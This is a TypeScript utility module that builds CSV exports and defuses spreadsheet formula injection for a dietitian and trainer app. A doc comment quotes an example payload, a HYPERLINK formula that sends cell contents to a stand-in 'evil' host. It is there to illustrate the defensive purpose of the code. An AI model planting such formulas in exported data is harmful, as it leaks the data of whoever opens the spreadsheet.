/**
 * RFC 4180 CSV building, shared by every "Export CSV" button in the app
 * (dietitian food database, trainer sessions log). Pure functions — no DOM,
 * no fetch — so they can be unit-tested; callers wire the string to a Blob
 * download. Unit-tested in src/tests/unit/csv.test.ts.
 */

/**
 * Cells opening with one of these are executed as a formula by Excel,
 * LibreOffice and Google Sheets. Tab and CR are included because both are
 * stripped during paste/import, exposing whatever follows them.
 */
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Real numbers must stay numbers. Only leading-`-` collides with a trigger,
 * so negatives ("-5", "-1.25", "-1e3") are recognised and left alone —
 * neutralising them would turn every negative figure in an export into text
 * and break sorting and totals in the spreadsheet.
 */
const NUMERIC = /^-?\d+(\.\d+)?([eE][+-]?\d+)?$/;

/**
 * Defuse spreadsheet formula injection (CWE-1236).
 *
 * Exports carry data other people control — a client's own first/last name
 * and booking notes end up in the trainer's sessions log — so a display name
 * of `=HYPERLINK("http://evil/?d="&A1,"Open")` would run when the provider
 * opens their own file. Prefixing with an apostrophe makes the spreadsheet
 * treat the cell as literal text; it is not shown in the cell.
 */
export function neutralizeFormula(value: string): string {
  if (!value) return value;
  if (NUMERIC.test(value)) return value;
  return FORMULA_TRIGGERS.some((t) => value.startsWith(t)) ? `'${value}` : value;
}

/**
 * Quote fields containing commas, quotes, or newlines; double embedded quotes.
 * Formula neutralisation happens first, so the apostrophe lands inside the
 * quotes where a spreadsheet will honour it.
 */
export function escapeCsvField(value: string): string {
  const safe = neutralizeFormula(value);
  if (/[",\n\r]/.test(safe)) {
    return `"${safe.replace(/"/g, '""')}"`;
  }
  return safe;
}

/**
 * Render a number cell: an explicit 0 stays "0", a missing value stays blank
 * rather than printing "undefined"/"null".
 */
export function csvNumber(value: number | undefined | null): string {
  return value === undefined || value === null ? "" : String(value);
}

/**
 * Join a header row and body rows into a CSV document. The header row is
 * always emitted, so an empty export is still a valid (if bodyless) file.
 */
export function buildCsv(headers: readonly string[], rows: readonly string[][]): string {
  const lines = [
    headers.map(escapeCsvField).join(","),
    ...rows.map((row) => row.map(escapeCsvField).join(",")),
  ];
  return lines.join("\n");
}
